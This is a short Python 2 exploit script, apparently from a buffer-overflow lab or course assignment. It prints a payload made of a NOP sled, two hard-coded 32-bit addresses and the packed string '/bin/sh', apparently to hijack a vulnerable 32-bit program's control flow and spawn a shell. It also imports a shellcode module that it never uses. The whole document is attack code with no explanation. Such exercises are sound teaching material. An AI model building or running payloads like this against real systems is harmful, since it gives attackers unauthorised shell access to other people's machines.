from struct import pack
from shellcode import shellcode
print '\x90' * 22 + pack("<I", 0x08048eed) + pack("<I", 0xbffeb6b4) + pack("<I", 0x6e69622f) + pack("<I", 0x0068732f)